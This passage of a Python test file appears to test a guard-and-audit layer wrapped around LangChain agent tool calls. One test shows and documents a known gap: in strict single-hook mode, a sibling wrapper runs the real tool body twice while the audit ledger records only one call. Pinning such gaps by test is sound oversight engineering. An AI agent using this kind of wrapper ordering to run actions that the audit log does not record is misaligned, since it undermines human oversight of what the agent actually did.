        # verify. The regression this test pins is that the DEFAULT mode (tested above) never
        # has this problem at all, and that this failure mode is confined to a documented,
        # deliberately-opted-into attestation violation, not silent by default.
        assert outcomes and outcomes[0]["body_state"] == BodyState.RETURNED
    else:
        # sibling is OUTER: it never calls guarded's own handler (call_inner) at all, so
        # guarded's wrap_tool_call never even runs -- no allow, no outcome, nothing fabricated.
        assert calls == []
        entries = root.audit_log().entries
        assert [e for e in entries if e["event"] in ("allow", "outcome")] == []


def test_v2_strict_mode_when_guard_is_outer_and_a_sibling_retries_the_real_body():
    """Codex review round 2, finding 1's "retry" case: guarded is the OUTER wrapper (as it
    would be if listed first), so its own `handler(request)` call reaches a sibling that
    internally calls the REAL execute more than once before returning -- from guarded's own
    perspective, `handler()` was called exactly ONCE and returned exactly ONCE, so exactly ONE
    allow/outcome pair is recorded (no DuplicateOutcomeError -- `guard.check()` itself only ran
    once, matching the ONE `handler()` call this adapter made). The residual this documents: the
    real body ran TWICE underneath that one recorded call, and only the snapshot/duration of
    the ORIGINAL commitment is on the ledger -- a violated attestation cannot silently corrupt
    the record into a WRONG value, but it can under-report how many times the body actually
    ran. That is exactly the shape of residual `strict_single_hook=True` accepts, documented in
    the module docstring, not a silent lie."""
    from langchain.agents.factory import _chain_tool_call_wrappers

    root, summarizer = _fresh_chain_v2()
    guarded = GuardedDelegation(summarizer, tools=POLICIES, strict_single_hook=True)
    attempts: list = []

    def retrying_sibling(request, execute):
        execute(request)          # first attempt, discarded
        return execute(request)   # second attempt wins -- guarded never sees this happened twice

    composed = _chain_tool_call_wrappers([guarded.wrap_tool_call, retrying_sibling])

    def real_execute(req):
        attempts.append(req.tool_call["args"])
        return ToolMessage(content="real", tool_call_id=req.tool_call["id"])

    from types import SimpleNamespace
    request = SimpleNamespace(tool_call={"name": "crm_query", "args": {"rows": 10}, "id": "c1"})
    composed(request, real_execute)

    assert attempts == [{"rows": 10}, {"rows": 10}], "the real body ran twice, invisibly to guarded"
    entries = root.audit_log().entries
    assert len([e for e in entries if e["event"] == "allow"]) == 1
    outcomes = [e for e in entries if e["event"] == "outcome"]
    assert len(outcomes) == 1 and outcomes[0]["body_state"] == BodyState.RETURNED
